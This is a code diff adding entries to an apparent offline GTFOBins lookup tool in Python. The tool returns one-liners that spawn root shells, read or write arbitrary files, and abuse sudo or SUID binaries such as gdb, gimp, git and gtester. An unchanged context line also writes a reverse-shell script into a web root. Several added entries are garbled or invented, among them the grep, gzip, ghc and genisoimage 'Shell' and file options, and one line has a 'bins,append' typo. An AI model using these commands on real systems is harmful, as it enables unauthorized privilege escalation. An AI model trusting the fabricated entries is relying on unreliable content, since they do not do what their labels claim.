@@ -1561,7 +1561,187 @@ def gtfo_bins(zip_command, zip_options):
         elif zip_options == "file-write":
             bins.append("put reverse_shell.sh /var/www/html/reverse_shell.sh")
         elif zip_options == "suid":
-            bins.append("sudo install -m =xs $(which fping) .\nsudo ftp\n!/bin/sh")
+            bins.append("sudo install -m =xs $(which ftp) .\nsudo ftp\n!/bin/sh")
+
+    elif zip_command == "gawk":
+        if zip_options == "Shell":
+            bins.append("gawk 'BEGIN {system(""/bin/sh"")}'")
+        elif zip_options == "file-write":
+            bins.append("LFILE=file_to_write\ngawk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'")
+        elif zip_options == "file-read":
+            bins.append("LFILE=file_to_read\ngawk '//' ""$LFILE""")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which gawk) .\nLFILE=file_to_read\n./gawk '//' ""$LFILE""")
+        elif zip_options == "sudo":
+            bins.append("sudo gawk 'BEGIN {system(""/bin/sh"")}'")
+
+    elif zip_command == "gcloud":
+        if zip_options == "Shell":
+            bins.append("gcloud help\n!/bin/sh")
+        elif zip_options == "sudo":
+            bins.append("sudo gcloud help\n!/bin/sh")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which gcloud) .\n./gcloud help\n!/bin/sh")
+        elif zip_options == "file-read":
+            bins,append("gsutil cat gs://[BUCKET_NAME]/[FILE_PATH]")
+        elif zip_options == "file-write":
+            bins.append("gsutil cp [LOCAL_FILE_PATH] gs://[BUCKET_NAME]/[DESTINATION_PATH]")
+
+    elif zip_command == "gcore":
+        if zip_options == "file-read":
+            bins.append("gcore $PID")
+        elif zip_options == "sudo":
+            bins.append("sudo gcore $PID")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which gcore) .\n./gcore $PID")
+        elif zip_options == "Shell":
+            bins.append("bash &\nsudo gcore -o core_dump [PID]")
+        elif zip_options == "file-write":
+            bins.append("gcore -o [output_file_prefix] [PID]")
+
+    elif zip_command == "gdb":
+        if zip_options == "Shell":
+            bins.append("gdb -nx -ex '!sh' -ex quit")
+        elif zip_options == "file-write":
+            bins.append("LFILE=file_to_write\ngdb -nx -ex ""dump value $LFILE \"DATA\""" -ex quit")
+        elif zip_options == "file-read":
+            bins.append("gdb -nx -ex 'python print(open(""file_to_read"").read())' -ex quit")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which gdb) .\n./gdb -nx -ex 'python import os; os.execl(""/bin/sh"", ""sh"", ""-p"")' -ex quit")
+        elif zip_options == "sudo":
+            bins.append("sudo gdb -nx -ex '!sh' -ex quit")
+
+    elif zip_command == "gem":
+        if zip_options == "Shell":
+            bins.append("gem open -e ""/bin/sh -c /bin/sh"" rdoc")
+        elif zip_options == "file-write":
+            bins.append("TF=$(mktemp -d)\necho 'system(""/bin/sh"")' > $TF/x\ngem build $TF/x")
+        elif zip_options == "file-read":
+            bins.append("gem open rdoc\n:!/bin/sh")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which gem) .\n./gem open -e ""/bin/sh -c /bin/sh"" rdoc")
+        elif zip_options == "sudo":
+            bins.append("sudo gem open -e ""/bin/sh -c /bin/sh"" rdoc")
+
+    elif zip_command == "genie":
+        if zip_options == "Shell":
+            bins.append("genie -c '/bin/sh'")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which genie) .\n./genie -c '/bin/sh'")
+        elif zip_options == "sudo":
+            bins.append("sudo genie -c '/bin/sh'")
+        elif zip_options == "file-read":
+            bins.append("genie -s\ncat /path/to/file.txt")
+        elif zip_options == "file-write":
+            bins.append("echo ""SCRIPT"" > /path/to/file.txt")
+
+    elif zip_command == "genisoimage":
+        if zip_options == "file-read":
+            bins.append("LFILE=file_to_read\ngenisoimage -q -o - ""$LFILE""")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which genisoimage) .\nLFILE=file_to_read\n./genisoimage -sort ""$LFILE""")
+        elif zip_options == "sudo":
+            bins.append("sudo LFILE=file_to_read\ngenisoimage -q -o - ""$LFILE""")            
+        elif zip_options == "Shell":
+            bins.append("genisoimage -o /path/to/output.iso -b isolinux/isolinux.bin -c isolinux/boot.cat -no-emul-boot -boot-load-size 4 -boot-info-table -R -J /path/to/bootable/directory && echo -e ""DEFAULT linux\nLABEL linux\n  KERNEL /boot/vmlinuz\n  APPEND init=/bin/bash"" > /path/to/bootable/directory/isolinux/isolinux.cfg")
+        elif zip_options == "file-write":
+            bins.append("LFILE=file_to_write\ngenisoimage -q -o - ""$LFILE""")
+
+    elif zip_command == "ghc" or zip_command == "ghci":
+        if zip_options == "Shell":
+            bins.append("ghc -e 'System.Process.callCommand ""/bin/sh""'")
+        elif zip_options == "sudo":
+            bins.append("sudo ghc -e 'System.Process.callCommand ""/bin/sh""'")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which ghc) .\n./ghc -e 'System.Process.callCommand ""/bin/sh""'")
+        elif zip_options == "file-write":
+            bins.append("ghc -o output_file input_file.hs")
+        elif zip_options == "file-read":
+            bins.append("ghc -o readFileProgram ReadFile.hs")
+
+    elif zip_command == "gimp":
+        if zip_options == "Shell":
+            bins.append("gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(""sh"")'")
+        elif zip_options == "file-write":
+            bins.append("gimp -idf --batch-interpreter=python-fu-eval -b 'open(""file_to_write"", ""wb"").write(""DATA"")'")
+        elif zip_options == "file-read":
+            bins.append("gimp -idf --batch-interpreter=python-fu-eval -b 'print(open(""file_to_read"").read())'")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which gimp) .\n./gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(""/bin/sh"", ""sh"", ""-p"")'")
+        elif zip_options == "sudo":
+            bins.append("sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(""sh"")'")
+
+    elif zip_command == "ginsh":
+        if zip_options == "Shell":
+            bins.append("ginsh\n!/bin/sh")
+        elif zip_options == "sudo":
+            bins.append("sudo ginsh\n!/bin/sh")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which ginsh) .\n./ginsh\n!/bin/sh")
+        elif zip_options == "file-read":
+            bins.append("cat /path/to/file.txt")
+        elif zip_options == "file-write":
+            bins.append("echo ""SCRIPT"" > /path/to/file.txt")
+
+    elif zip_command == "git":
+        if zip_options == "Shell":
+            bins.append("git help config\n!/bin/sh")
+        elif zip_options == "file-write":
+            bins.append("git apply --unsafe-paths --directory / x.patch")
+        elif zip_options == "file-read":
+            bins.append("LFILE=file_to_read\ngit diff /dev/null $LFILE")
+        elif zip_options == "sudo":
+            bins.append("sudo git help config\n!/bin/sh")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which git) .\nPAGER='sh -c ""exec sh 0<&1""' ./git -p help")
+
+    elif zip_command == "grc":
+        if zip_options == "Shell":
+            bins.append("grc --pty /bin/sh")
+        elif zip_options == "sudo":
+            bins.append("sudo grc --pty /bin/sh")
+        elif zip_options == "file-read":
+            bins.append("grc cat filename.txt")
+        elif zip_options == "file-write":
+            bins.append("grc echo "" > filename.txt")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which grc) .\ngrc --pty /bin/sh")
+
+    elif zip_command == "grep":
+        if zip_options == "file-read":
+            bins.append("LFILE=file_to_read\ngrep '' $LFILE")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which grep) .\nLFILE=file_to_read\n./grep '' $LFILE")
+        elif zip_options == "sudo":
+            bins.append("sudo LFILE=file_to_read\ngrep '' $LFILE")
+        elif zip_options == "Shell":
+            bins.append("echo ""Hello World"" | grep -q ""Hello"" && bash")
+        elif zip_options == "file-write":
+            bins.append("grep ""pattern"" file.txt > output.txt")
+
+    elif zip_command == "gtester":
+        if zip_options == "Shell":
+            bins.append("TF=$(mktemp)\necho '#!/bin/sh' > $TF\necho 'exec /bin/sh -p 0<&1' >> $TF\nchmod +x $TF\ngtester -q $TF")
+        elif zip_options == "file-write":
+            bins.append("LFILE=file_to_write\ngtester ""DATA"" -o $LFILE")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which gtester) .\nTF=$(mktemp)\necho '#!/bin/sh -p' > $TF\necho 'exec /bin/sh -p 0<&1' >> $TF\nchmod +x $TF\nsudo gtester -q $TF")
+        elif zip_options == "sudo":
+            bins.append("sudo TF=$(mktemp)\necho '#!/bin/sh' > $TF\necho 'exec /bin/sh -p 0<&1' >> $TF\nchmod +x $TF\ngtester -q $TF")
+        elif zip_options == "file-read":
+            bins.append("LFILE=file_to_read\ngtester ""DATA"" -o $LFILE")
+
+    elif zip_command == "gzip":
+        if zip_options == "file-read":
+            bins.append("LFILE=file_to_read\ngzip -f $LFILE -t")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which gzip) .\nLFILE=file_to_read\n./gzip -f $LFILE -t")
+        elif zip_options == "sudo":
+            bins.append("sudo LFILE=file_to_read\ngzip -f $LFILE -t")
+        elif zip_options == "Shell":
+            bins.append("echo -n ""bash"" | gzip > bash_one_liner.gz\ngzip -dc bash_one_liner.gz | bash")
+        elif zip_options == "file-write":
+            bins.append("gzip -c myfile.txt > myfile.txt.gz")
 
 #If there are any other misconfigurations run the other option
     elif zip_command == "other":
@@ -1578,7 +1758,7 @@ def main():
     start = input("Off-Grid, the offline GTFO Bin lookup tool, what is misconfigured?\n")
 
     #Tool selection for Linux misconfigurations
-    if start == "zip" or start == "7zip" or start == "base64" or start == "bash" or start == "awk" or start == "base32" or start == "busybox" or start == "cat" or start == "neofetch" or start == "cp" or start == "curl" or start == "chmod" or start == "dosbox" or start == "dmesg" or start == "gcc" or start == "vim" or start == "vi" or start == "nano" or start == "zsh" or start == "dd" or start == "aa-exec" or start == "ab" or start == "agetty" or start == "alpine" or start == "ansible-playbook" or start == "ansible-test" or start == "aoss" or start == "apache2ctl" or start == "apt-get" or start == "ar" or start == "apt" or start == "aria2c" or start == "arj" or start == "arp" or start == "as" or start == "ascii-xfr" or start == "ascii85" or start == "ash" or start == "aspell" or start == "at" or start == "atobm" or start == "aws" or start == "base58" or start == "basenc" or start == "basez" or start == "batcat" or start == "bc" or start == "bconsole" or start == "bpftrace" or start == "bridge" or start == "bundle" or start == "bundler" or start == "busctl" or start == "byebug" or start == "bzip2" or start == "c89" or start == "c99" or start == "cabal" or start == "cancel" or start == "capsh" or start == "cdist" or start == "certbot" or start == "check_by_ssh" or start == "check_cups" or start == "check_log" or start == "check_memory" or start == "check_raid" or start == "check_ssl_cert" or start == "check_statusfile" or start == "choom" or start == "chown" or start == "chroot" or start == "clamscan" or start == "cmp" or start == "cobc" or start == "column" or start == "comm" or start == "composer" or start == "cowsay" or start == "cowthink" or start == "cpan" or start == "cpio" or start == "cpulimit" or start == "crash" or start == "crontab" or start == "csh" or start == "csvtool" or start == "cupsfilter" or start == "cut" or start == "dash" or start == "date" or start == "dc" or start == "debugfs" or start == "dialog" or start == "diff" or start == "dig" or start == "distcc" or start == "dmidecode" or start == "dmsetup" or start == "dnf" or start == "docker" or start == "dos2unix" or start == "dotnet" or start == "dpkg" or start == "dstat" or start == "dvips" or start == "dvips" or start == "eb" or start == "ed" or start == "efax" or start == "emacs" or start == "elvish" or start == "enscript" or start == "env" or start == "eqn" or start == "espeak" or start == "ex" or start == "exiftool" or start == "expand" or start == "expect" or start == "facter" or start == "file" or start == "find" or start == "finger" or start == "fish" or start == "flock" or start == "fmt" or start == "fold" or start == "fping" or start == "ftp" or start == "other":  
+    if start == "zip" or start == "7zip" or start == "base64" or start == "bash" or start == "awk" or start == "base32" or start == "busybox" or start == "cat" or start == "neofetch" or start == "cp" or start == "curl" or start == "chmod" or start == "dosbox" or start == "dmesg" or start == "gcc" or start == "vim" or start == "vi" or start == "nano" or start == "zsh" or start == "dd" or start == "aa-exec" or start == "ab" or start == "agetty" or start == "alpine" or start == "ansible-playbook" or start == "ansible-test" or start == "aoss" or start == "apache2ctl" or start == "apt-get" or start == "ar" or start == "apt" or start == "aria2c" or start == "arj" or start == "arp" or start == "as" or start == "ascii-xfr" or start == "ascii85" or start == "ash" or start == "aspell" or start == "at" or start == "atobm" or start == "aws" or start == "base58" or start == "basenc" or start == "basez" or start == "batcat" or start == "bc" or start == "bconsole" or start == "bpftrace" or start == "bridge" or start == "bundle" or start == "bundler" or start == "busctl" or start == "byebug" or start == "bzip2" or start == "c89" or start == "c99" or start == "cabal" or start == "cancel" or start == "capsh" or start == "cdist" or start == "certbot" or start == "check_by_ssh" or start == "check_cups" or start == "check_log" or start == "check_memory" or start == "check_raid" or start == "check_ssl_cert" or start == "check_statusfile" or start == "choom" or start == "chown" or start == "chroot" or start == "clamscan" or start == "cmp" or start == "cobc" or start == "column" or start == "comm" or start == "composer" or start == "cowsay" or start == "cowthink" or start == "cpan" or start == "cpio" or start == "cpulimit" or start == "crash" or start == "crontab" or start == "csh" or start == "csvtool" or start == "cupsfilter" or start == "cut" or start == "dash" or start == "date" or start == "dc" or start == "debugfs" or start == "dialog" or start == "diff" or start == "dig" or start == "distcc" or start == "dmidecode" or start == "dmsetup" or start == "dnf" or start == "docker" or start == "dos2unix" or start == "dotnet" or start == "dpkg" or start == "dstat" or start == "dvips" or start == "dvips" or start == "eb" or start == "ed" or start == "efax" or start == "emacs" or start == "elvish" or start == "enscript" or start == "env" or start == "eqn" or start == "espeak" or start == "ex" or start == "exiftool" or start == "expand" or start == "expect" or start == "facter" or start == "file" or start == "find" or start == "finger" or start == "fish" or start == "flock" or start == "fmt" or start == "fold" or start == "fping" or start == "ftp" or start == "gawk" or start == "gcloud" or start == "gcore" or start == "gdb" or start == "gem" or start == "genie" or start == "genisoimage" or start == "ghc" or start == "ghci" or start == "gimp" or start == "ginsh" or start == "git" or start == "grc" or start == "grep" or start == "gtester" or start == "gzip" or start == "other":  
         zip_options = input("Choose following options: Shell, file-read, file-write, sudo, suid\n")
 
         if zip_options in ["Shell", "file-read", "file-write", "sudo", "suid"]:
